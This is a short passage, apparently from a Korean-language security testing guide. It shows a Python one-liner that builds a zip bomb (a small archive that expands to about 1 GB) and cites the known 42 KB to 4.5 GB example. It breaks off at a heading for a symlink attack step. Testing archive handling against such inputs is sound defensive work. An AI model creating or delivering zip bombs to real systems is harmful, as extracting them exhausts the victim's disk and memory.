    # 42 KB → 4.5 GB (원자 폭탄)

    # 또는 직접 생성
    python3 -c "
    import zipfile
    data = b'A' * (1024*1024)  # 1 MB
    with zipfile.ZipFile('/tmp/bomb.zip', 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(1000):
            zf.writestr(f'{i}.txt', data)
    "
    ls -la /tmp/bomb.zip  # 작은 크기 → 압축 해제 시 1 GB
    ```

    ▶ 4단계: 도구 C — symlink 공격
    ```bash
